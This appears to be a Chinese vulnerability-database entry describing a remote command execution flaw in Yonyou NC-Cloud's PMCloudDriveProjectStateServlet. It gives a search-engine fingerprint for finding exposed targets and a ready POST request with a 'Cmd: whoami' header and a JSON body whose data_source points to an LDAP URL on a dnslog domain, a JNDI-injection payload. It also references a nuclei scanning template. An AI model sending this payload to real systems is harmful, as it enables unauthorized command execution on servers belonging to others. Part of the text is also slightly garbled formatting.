# 用友NC-CloudPMCloudDriveProjectStateServlet存在远程命令执行漏洞

- **系统**：用友　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`app="用友-NC-Cloud"`
- **请求**：`POST /service/~aert/PMCloudDriveProjectStateServlet HTTP/1.1`

**请求体 / payload**
```
1. 用yakit生成dnslog域名
2. 探测是否存在漏洞
Host: {hostname}
Cmd: whoami
Cookie: JSESSIONID=53521AE090615957863B7EFC1AEC1F39.server
Content-Type: application/x-www-form-urlencoded
Content-Length: 73
{"data_source":"ldap://4vfh9q.dnslog.cn","user":"admin","pk_group":"111"}

nuclei脚本\
\[用友-nc-cloud-pmclouddriveprojectstateservlet-远程命令执行.yaml]\(公众号：渗透安全HackTwo
```

**其他**
- 用友NC-Cloud PMCloudDriveProjectStateServlet 存在远程命令执行漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
  * 四、漏洞复现
***
- 版本: * 用友NC-Cloud